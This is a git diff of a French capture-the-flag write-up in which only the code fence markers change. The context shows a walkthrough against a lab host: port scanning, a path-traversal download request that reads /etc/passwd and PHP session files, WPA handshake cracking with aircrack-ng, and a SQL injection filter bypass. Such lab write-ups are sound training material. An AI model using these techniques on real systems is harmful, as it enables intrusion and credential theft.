@@ -10,7 +10,7 @@ Le challenge était destiné à des étudiants. Même s'il n'était pas d'un gra
 Italie
 ------
 
-```plain
+```
 Nmap scan report for 192.168.2.2
 Host is up (0.00022s latency).
 Not shown: 65522 closed ports
@@ -150,7 +150,7 @@ Croatie
 
 Cette fois on se rend sur le port 15020 (Apache en HTTPS), on lance à nouveau un dirbuster et on trouve les dossiers suivants :  
 
-```plain
+```
 https://192.168.2.2:15020/blog/
 https://192.168.2.2:15020/vault/
 ```
@@ -159,7 +159,7 @@ La première adresse parle d'elle-même, la seconde est une arborescence bien ch
 
 J'ai décidé de me concentrer d'abord sur le blog. Ce dernier a des liens cassés mais globalement le format d'URL pour les articles est le suivant :  
 
-```plain
+```
 https://192.168.2.2:15020/blog/post.php?id=3
 ```
 
@@ -179,7 +179,7 @@ curl -X POST https://192.168.2.2:15020/blog/download.php --data "image=/home/kev
 
 J'en profite pour récupérer le fichier /etc/passwd dont voici un extrait :  
 
-```plain
+```
 teo:x:1000:1000:teo,,,:/home/teo:/bin/bash
 kevin:x:1001:1001::/home/kevin:
 ejabberd:x:111:114::/var/lib/ejabberd:/bin/sh
@@ -190,7 +190,7 @@ En dehors de kevin les deux autres utilisateurs n'ont pas de shell définit. On 
 
 Et on remarque via */etc/group* que *teo* est le seul utilisateur intéressant :  
 
-```plain
+```
 cdrom:x:24:teo
 floppy:x:25:teo
 audio:x:29:teo
@@ -222,7 +222,7 @@ Pas mal mais ce qui nous intéresse c'est surtout la configuration pour la parti
 
 A la mano et après quelques essais rapides je trouve le bon chemin : */etc/apache2/sites-enabled/default-ssl.conf*. Ce fichier a quelques infos comme :  
 
-```plain
+```
 DocumentRoot /var/www/ssl
 SSLCertificateFile /etc/ssl/localcerts/apache.pem
 SSLCertificateKeyFile /etc/ssl/localcerts/apache.key
@@ -335,7 +335,7 @@ Il nous faut d'abord retrouver le chemin des sessions PHP défini dans le fichie
 
 Les lignes qui nous intéressent le plus :  
 
-```plain
+```
 allow_url_fopen = On                                                                                                   
 allow_url_include = Off
 ;session.save_path = "/var/lib/php/sessions"
@@ -343,7 +343,7 @@ allow_url_include = Off
 
 Certes le chemin est commenté mais c'est celui par défaut. Je vois avec *EditMyCookie* que mon identifiant de session PHPSESSID est *mvmt1duldlu7fvrs5jm38hpel0*. Dès lors je dumpe le contenu du fichier */var/lib/php/sessions/sess\_mvmt1duldlu7fvrs5jm38hpel0* :  
 
-```plain
+```
 securimage_code_disp|a:1:{s:7:"default";s:6:"reDMGY";}securimage_code_value|a:1:{s:7:"default";s:6:"redmgy";}securimage_code_ctime|a:1:{s:7:"default";i:1519726037;}securimage_code_audio|a:1:{s:7:"default";N;}
 ```
 
@@ -370,7 +370,7 @@ find . -type f ! -name "*index*"
 
 Ce qui nous amène deux fichiers :  
 
-```plain
+```
 ./192.168.2.2:15020/vault/Door222/Vault70/ctf.cap                                                                                                                                                                                             
 ./192.168.2.2:15020/vault/Door223/Vault1/rockyou.zip
 ```
@@ -383,7 +383,7 @@ aircrack-ng -w rockyou.txt ctf.cap
 
 Et ça tombe :  
 
-```plain
+```
                                  Aircrack-ng 1.2 beta3
 
                    [00:34:56] 3448372 keys tested (1674.08 k/s)
@@ -409,7 +409,7 @@ C'était donc à ce moment là que j'aurais du obtenir le flag des *Philippines*
 
 Le substitution en place pour la protection SQL est plutôt facile à passer. Ainsi si on place deux espaces entre *union* et *select* ça passe :  
 
-```plain
+```
 /blog/admin/edit.php?id=10%20union%20%20select%201,2,user(),3;
 ```
 
@@ -458,7 +458,7 @@ Le seul flag restant est la France... c'est ballot.
 
 Quand il y a plusieurs flags à trouver il y en a un généralement caché... juste devant nous. Ça n'a pas raté :  
 
-```plain
+```
 $ openssl s_client -connect 192.168.2.2:15020
 CONNECTED(00000003)
 depth=0 C = FR, ST = Paris, L = Paris, O = CTF, CN = a51f0eda836e4461c3316a2ec9dad743, emailAddress = ctf@root.local
